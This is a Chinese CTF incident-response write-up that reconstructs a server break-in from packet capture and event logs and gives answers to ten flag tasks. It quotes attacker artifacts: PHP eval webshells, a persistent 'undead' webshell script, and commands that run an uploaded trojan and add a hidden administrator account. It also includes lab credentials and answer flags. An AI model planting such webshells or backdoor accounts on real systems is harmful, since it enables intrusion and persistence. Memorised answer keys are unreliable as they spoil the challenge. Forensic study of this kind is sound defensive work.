# 流量捕获+emergency

有一台客户的服务器被黑客入侵了，好在安全工程师开启了流量包，请你完成这些题目，提升服务器的安全性吧！

用户名：Administrator
密码：Qsnctf2025

链接: https://pan.baidu.com/s/1LxYbnbYPpzTj0eL1yRKxiA 提取码: db5g
压缩包密码：349df0a5061cfd47e375c8dba9c773d7
赛题为：流量捕获.pcapng + emergency靶场

## 任务1 
任务名称：提交黑客的IP地址
任务分数：2.00
任务类型：静态Flag
提交格式为flag{0.0.0.0}

protocol == http过滤，发现10.0.100.69攻击10.0.100.13

```text
flag{10.0.100.69}
```

## 任务2 
任务名称：提交黑客初始连接的PHP一句话木马密码
任务分数：2.00
任务类型：静态Flag
提交格式为flag{abc}

protocol == http过滤，发现No.894 No.901内容是初始连接的PHP一句话木马。
```text
No.894  
Form item: "value" = "<?php @eval([$_POST['shell']]) ?>"  

No.901  
{"status":1,"message":"\u64cd\u4f5c\u6210\u529f\uff01"} 操作成功！  
```

```text
flag{shell}
```

## 任务3 
任务名称：提交黑客通过初始连接一句话木马后创建新的一句话木马文件的MD5
任务分数：2.00
任务类型：静态Flag
提交格式为flag{md5}

protocol == http过滤，发现No.53923 No.53926创建新的一句话木马文件shell.php
```text
No.53923
C:/phpstudy_pro/WWW/shell.php

No.53926
shell.php
<?php @eval($_POST["qsnctf_2025_lab"]); ?>
```

```text
flag{91a29f36879b024d661851b7765f3969}
```

## 任务4 
任务名称：提交黑客创建的不死马的密码
任务分数：2.00
任务类型：静态Flag
提交格式为flag{md5}

```text
protocol == http过滤，发现No.54240  No.54250s是上传不死马bsm.php
No.54240  
C:/phpstudy_pro/WWW/bsm.php
```

```php
<?php
ignore_user_abort(true);
set_time_limit(0);

$shell_content = '<?php @eval($_POST["4aad625950d058c24711560e5f8445b9"]); ?>';
$shell_path = __DIR__ . '/.config.php';

while (true) {
    if (!file_exists($shell_path)) {
        file_put_contents($shell_path, $shell_content);
        chmod($shell_path, 0444); 
    }
    sleep(5);
}
?>
```

```text
flag{4aad625950d058c24711560e5f8445b9}
```

## 任务5 
任务名称：提交黑客上传的恶意文件（远程控制木马）的名称
任务分数：2.00
任务类型：静态Flag
提交格式为flag{abc.exe}

protocol == http过滤，发现No.68118 No.68167上传shell.exe，No.69165执行shell.exe

```text
No.68118
C:/phpstudy_pro/WWW/shell.exe

No.69165  执行shell.exe
cd /d "C:\\phpstudy_pro\\WWW" & shell.exe & echo 8f92ab47 & cd & echo dbeb03f5
```

```text
flag{shell.exe}
```

## 任务6
任务名称：提交黑客上传的恶意文件（远程控制木马）的MD5
任务分数：2.00
任务类型：静态Flag
提交格式为flag{md5}

```text
flag{0410284ea74b11d26f868ead6aa646e1}
```

## 任务7 需要执行一下
任务名称：提交黑客上传的恶意文件（远程控制木马）的端口
任务分数：2.00
任务类型：静态Flag
提交格式为flag{1234}

## 任务8
任务名称：请提交黑客创建用户账户的用户名
任务分数：2.00
任务类型：静态Flag
提交格式为flag{username}

protocol == http过滤
发现No.73634、No.73637添加账号密码
```text
cd /d "C:\\phpstudy_pro\\WWW" & net user hidden$ P@ssw0rd123 /add & echo 8f92ab47 & cd & echo dbeb03f5
```

发现No.73718、No.73721添加账号hidden$到管理员组
```text
cd /d "C:\\phpstudy_pro\\WWW" & net localgroup administrators hidden$ /add & echo 8f92ab47 & cd & echo 
```

```text
flag{hidden$}
```

## 任务9
任务名称：请提交黑客创建用户账户的密码
任务分数：2.00
任务类型：静态Flag
提交格式为flag{password}

```text
flag{P@ssw0rd123}
```

## 任务10
任务名称：请提交黑客创建用户账户的时间
任务分数：2.00
任务类型：静态Flag
flag{2025/01/01 01:00:00}

登录靶机，打开eventvwr查看日志。过滤事件ID：4720（创建用户），发现一条。
|![创建账号日志](./images/Solar202511-01-user.png)|
|:--:|
| 过滤事件ID：4720（创建用户），发现一条。 |

```text
flag{2025/11/20 16:13:32}
```